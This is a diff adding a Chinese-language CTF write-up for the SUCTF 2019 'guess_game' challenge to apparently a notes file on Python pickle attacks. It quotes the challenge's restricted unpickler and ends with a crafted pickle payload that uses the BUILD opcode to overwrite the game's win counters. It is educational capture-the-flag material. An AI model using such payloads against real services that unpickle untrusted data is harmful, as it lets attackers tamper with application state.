@@ -329,6 +329,113 @@ localhost:55555
 
 
 
+## 例题
+
+### suctf guess_game
+
+[题目链接]( https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game )
+
+考点:pickle
+
+代码审计一波后
+
+如果猜对10次后会给flag(机会只有10次)
+
+因为知道是考pickle直接全局搜索pickle发现在server处有
+
+`ticket = restricted_loads(ticket)`
+
+其中ticket是我们可控点
+
+跟进去看
+
+```python
+class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        # Only allow safe classes
+        if "guess_game" == module[0:10] and "__" not in name:
+            return getattr(sys.modules[module], name)
+        # Forbid everything else.
+        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
+
+
+def restricted_loads(s):
+    """Helper function analogous to pickle.loads()."""
+    return RestrictedUnpickler(io.BytesIO(s)).load()
+```
+
+我们只能加载guess_game中的类,并且不能调用魔术方法.
+
+在这一题中拿到flag有两种方式:
+
+1. 命令执行
+2. 通过游戏
+
+在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了
+
+而游戏中判定赢的条件是
+
+```python
+class Game
+	def is_win(self):
+        return self.win_count == max_round
+```
+
+如果我们能直接修改win_count或者max_round就可以拿到flag了
+
+我们发现在`guess_game`中已经有一个`game = Game()`这个了,也就是我们可以利用pickle来加载这个game直接修改
+
+那么接下来就是如何修改了
+
+在pickle的操作码中我们发现
+
+`BUILD          = b'b'   # call __setstate__ or __dict__.update()`这一条
+
+其中update()就可以修改game的属性了
+
+那么接下来就只有一个问题了,操作码`b`如何使用
+
+一路跟踪发现b操作码的实现
+
+```python
+    def load_build(self):
+        stack = self.stack
+        state = stack.pop()
+        inst = stack[-1]
+        setstate = getattr(inst, "__setstate__", None)
+        if setstate is not None:
+            setstate(state)
+            return
+        slotstate = None
+        if isinstance(state, tuple) and len(state) == 2:
+            state, slotstate = state
+        if state:
+            inst_dict = inst.__dict__
+            intern = sys.intern
+            for k, v in state.items():
+                if type(k) is str:
+                    inst_dict[intern(k)] = v
+                else:
+                    inst_dict[k] = v
+        if slotstate:
+            for k, v in slotstate.items():
+                setattr(inst, k, v)
+```
+
+没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象
+
+最后的payload:
+
+```python
+b"cguess_game\ngame\n(S'win_count'\nI10\nS'round_count'\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb."
+```
+
+
+
+
+
+
+
 ## 参考
 
  https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf 
